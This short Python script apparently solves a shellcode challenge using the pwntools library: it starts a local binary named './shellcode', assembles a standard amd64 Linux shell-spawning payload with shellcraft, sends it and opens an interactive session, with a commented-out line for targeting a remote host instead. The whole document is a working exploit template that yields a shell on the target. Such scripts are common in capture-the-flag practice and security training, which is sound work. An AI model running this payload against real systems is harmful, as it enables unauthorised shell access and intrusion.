from pwn import *
context.arch = 'amd64'
p = process('./shellcode')
# To connect to tcp server
# p = remote('ip', port)
shellcode = asm(shellcraft.amd64.linux.sh())
p.send(shellcode)
p.interactive()
